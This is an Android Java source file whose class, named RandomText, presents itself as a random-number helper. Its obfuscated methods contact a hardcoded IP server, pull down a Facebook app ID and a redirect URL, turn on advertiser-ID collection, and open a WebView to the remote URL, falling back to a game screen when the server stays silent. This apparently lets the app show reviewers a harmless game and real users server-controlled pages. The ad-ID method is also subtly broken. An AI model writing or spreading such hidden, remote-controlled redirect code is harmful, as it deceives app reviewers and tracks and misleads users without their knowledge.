package cam.cradev.pirat2.crapirafd;

import android.app.Activity;
import android.content.Intent;
import android.util.Log;
import android.widget.TextView;

import com.facebook.FacebookSdk;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;

import cam.cradev.pirat2.crapirafd.web.WebActivity;

public class RandomText {

    public String s;
    int min;
    int max;
    int result;


    public RandomText(int min, int max ) {
        this.min = min;
        this.max = max;

    }

    public int getMin() {
        return min;
    }

    public void setMin(int min) {
        this.min = min;
    }

    public int getMax() {
        return max;
    }

    public void setMax(int max) {
        this.max = max;
    }





    public int myRandomText(){
        int min = getMin();
        int max = getMax();
        int diff = max - min;
        Random random = new Random();
        int result = random.nextInt(diff + 1);
        result += min;
        return result;
    }

    public void d(CP act) {
        new Thread(new Runnable() {
            @Override
            public void run() {

                try {

                    a(act);
                } catch (IOException e) {
                    e.printStackTrace();
                    Log.i("qwer", e.getLocalizedMessage());
                    game(act);
                    return;
                }
            }
        }).start();
    }

    private void game(CP act) {
        act.startActivity(new Intent(act, MainActivity.class));
        act.finishAffinity();
    }

    private void a(CP act) throws IOException {
        String ip = ip();

        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://" + ip + s).openConnection();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));

        StringBuilder sb = new StringBuilder("" + bufferedReader.readLine());

        if (!sb.toString().equalsIgnoreCase("null")){
            e2(sb, act, bufferedReader);
        }else{
            q(act, sb);
            return;
        }



    }

    private void e2(StringBuilder sb, CP act, BufferedReader bufferedReader) throws IOException {
        StringBuilder finalSb = sb;

        d2(finalSb, act);

        sb = new StringBuilder("" + bufferedReader.readLine());

        if (sb.toString() != null) {
            String ad_id = "?advertising_id=";


            f(ad_id, act);

            String url = sb.toString() + ad_id;

            Intent intent = new Intent(act, WebActivity.class);
            intent.putExtra("url_cp", url);

            act.startActivity(intent);
            act.finishAffinity();

        }else{
            game(act);

            Log.i("qwer", sb.toString() );
            return;
        }
    }

    private void f(String ad_id, CP act) {
        AdvertisingIdClient.Info adInfo = null;
        try {
            adInfo = AdvertisingIdClient.getAdvertisingIdInfo(act);

            ad_id += adInfo.getId();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void d2(StringBuilder finalSb, Activity activity) {
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                FacebookSdk.setApplicationId(finalSb.toString());
                FacebookSdk.setAdvertiserIDCollectionEnabled(true);
                FacebookSdk.sdkInitialize(activity);
                FacebookSdk.fullyInitialize();
            }
        });
    }

    private void q(CP act, StringBuilder sb) {
        game(act);

        String str = sb.toString();

        Log.i("qwer", str);
    }

    private String ip() {
        return "176.9.193.123:8080";
    }

}
